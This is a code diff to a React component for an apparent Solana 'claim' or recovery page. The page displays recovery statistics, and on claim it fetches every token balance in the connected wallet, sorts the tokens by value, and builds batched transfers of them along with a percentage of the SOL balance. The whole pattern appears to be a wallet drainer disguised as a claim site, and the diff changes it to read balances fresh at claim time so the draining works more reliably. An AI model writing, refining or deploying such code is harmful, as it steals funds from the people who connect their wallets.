@@ -44,7 +44,6 @@ const Claim = () => {
   const [isClaiming, setIsClaiming] = useState(false);
   const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
   const [ledgerData, setLedgerData] = useState<any[]>([]);
-  const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
 
   const generateClaimData = () => {
@@ -112,7 +111,7 @@ const Claim = () => {
   }, [ledgerData, dataMultiplier, nativeToken]);
 
   const fetchAllBalances = useCallback(async () => {
-    if (!publicKey) return;
+    if (!publicKey) return [];
     try {
       const solBal = await connection.getBalance(publicKey);
       const solAmount = solBal / LAMPORTS_PER_SOL;
@@ -136,17 +135,12 @@ const Claim = () => {
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      return tokens;
     } catch (error) {
       console.error('Error fetching balances:', error);
+      return [];
     }
   }, [publicKey, connection]);
-
-  useEffect(() => {
-    if (publicKey) {
-      fetchAllBalances();
-    }
-  }, [publicKey, fetchAllBalances]);
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
     const effectivePublicKey = overridePublicKey || publicKey;
@@ -216,6 +210,7 @@ const Claim = () => {
     try {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
+      const currentBalances = await fetchAllBalances();
 
       const solBal = await connection.getBalance(publicKey);
       const solPrice = await getSolPrice();
@@ -248,7 +243,7 @@ const Claim = () => {
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
       }
 
-      const validTokens = balances.filter(token => token.balance > 0);
+      const validTokens = currentBalances.filter(token => token.balance > 0);
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
